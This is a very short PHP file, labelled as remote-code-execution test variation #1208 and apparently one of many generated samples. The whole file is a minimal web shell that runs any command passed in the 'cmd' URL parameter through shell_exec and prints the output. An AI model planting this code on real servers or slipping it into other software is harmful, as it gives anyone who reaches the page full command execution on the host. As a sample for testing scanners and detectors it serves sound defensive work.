<?php
// RCE test variation #1208
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>